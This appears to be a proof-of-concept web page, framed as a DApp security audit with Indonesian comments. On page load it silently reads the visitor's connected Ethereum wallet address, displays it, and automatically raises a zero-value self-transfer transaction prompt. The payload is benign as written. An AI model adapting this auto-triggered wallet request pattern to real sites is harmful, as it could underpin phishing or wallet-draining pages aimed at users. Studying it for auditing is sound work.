<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Audit: Automated DApp Interaction</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #050505; color: #00ff00; padding: 20px; }
        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #111; }
        .warning { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Security Audit: Bridge Access Proof</h2>
    <div id="status">Scanning DApp Bridge...</div>
    <div id="log" class="log"></div>

    <script>
        const status = document.getElementById('status');
        const log = document.getElementById('log');

        function addLog(msg) {
            log.innerHTML += `<div>> ${msg}</div>`;
        }

        async function initExploit() {
            if (!window.ethereum) {
                status.innerHTML = "<span class='warning'>[!] Bridge not found.</span>";
                return;
            }

            try {
                // Tahap 1: Injeksi otomatis untuk mendapatkan alamat tanpa user click
                addLog("Attempting silent identity extraction...");
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                
                if (accounts.length > 0) {
                    const address = accounts[0];
                    status.innerHTML = `<span style="color: #fff;">[!] Identity Exposed: ${address}</span>`;
                    addLog("Extraction successful.");

                    // Tahap 2: Memicu prompt transaksi asli
                    addLog("Triggering transaction sequence...");
                    
                    // Mengirim transaksi "kosong" ke alamat sendiri atau dead address
                    // Peramban DApp akan menampilkan popup asli setelah baris ini dieksekusi
                    await window.ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: address,
                            to: address, // Transfer ke diri sendiri untuk memicu popup
                            value: '0x0',
                            data: '0x'   // Tidak ada data, hanya trigger popup
                        }],
                    });
                    
                    addLog("Transaction prompt injected successfully.");
                } else {
                    addLog("No active accounts found.");
                }
            } catch (err) {
                addLog(`<span class='warning'>[!] Error: ${err.message}</span>`);
            }
        }

        window.onload = initExploit;
    </script>
</body>
</html>
